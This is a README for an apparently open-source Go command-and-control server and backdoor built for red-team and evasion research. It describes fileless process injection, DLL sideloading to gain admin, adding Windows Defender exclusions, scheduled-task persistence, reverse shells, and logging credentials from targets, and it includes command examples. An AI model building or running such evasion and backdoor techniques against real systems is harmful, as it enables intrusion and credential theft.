# Karmine

Karmine is a C2 server written in Go. It handles requests from a bot/backdoor ('Karma'), which has built-in dropping, exfiltration and AV evasion features. All communication happens over mTLS, with transferred objects AES-encrypted to avoid detection. Karma instances are run entirely in memory via [Process Injection](https://github.com/pygrum/karmine/tree/main/karl/runpe).

## Why?

I built this as part of independent research into malware detection evasion techniques. Some of the simpler techniques are included in the beacon ('Karma') of this project:
- Fileless execution: the final payload is embedded as an encrypted buffer into another program. It is then decrypted and injected into another process
- DLL sideloading: the custom DLL included in this project leverages a DLL sideloading 'vulnerability' in the trusted file `bthudtask.exe`, which auto-elevates to Admin. The DLL subsequently adds the 
current folder to the Windows Defender exclusion path, disables the cleaning of the temp folder, and creates a scheduled task for the payload to run each time the device restarts.
- As of release v0.1.0, there are no anti-analysis / sandboxing techniques built in.

## Use cases

This project is versatile; with potential for use within CTFs, as well as real life testing situations, due to it's enhanced evasion abilities.
I do NOT condone and will NOT be responsible for the use of this software for malicious purposes. This software is intended for educational + legal use only.

## Setup 

Run `install.sh` in the project root. This will set up configuration files, the `bin`, a x509 certificate-key pair, and a database. You can replace these with your own by replacing the ones in `~/.kdots/` with files of the same name. 
The project depends on ncat for you to set up a listener using the SSL keys in your configuration folder. The ncat command to do so printed to the terminal after a reverse shell is requested, so you can paste and run it in a separate terminal window.

### Dependencies

- `ncat`

## Usage 

### Example

```
$  new karma --interval 3
'karma' saved to /home/pygrum/karmine/bin


$  profiles view

uuid                                 | name         | strain
------------------------------------------------------------
181d70e4-cbc6-4bfd-9e96-7ccb31dbbc27 | 3a89aee34882 | karma

$  stage cmd --for 3a89aee34882 exec "powershell -c whoami /priv"
$  % 3a89aee34882 %  127.0.0.1:1337 ---
INFO[1139] exec powershell -c whoami /priv               type=cmd
INFO[1139] 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

The Karmine database logs all staged commands, active strains, and credentials from targets. In-built commands can be used to view this information.

### Commands

As of March 15 2023, there are 4 commands:
- `new`
- `profiles`
- `stage`
- `deploy`

To get usage info about these commands, type `<command> --help`
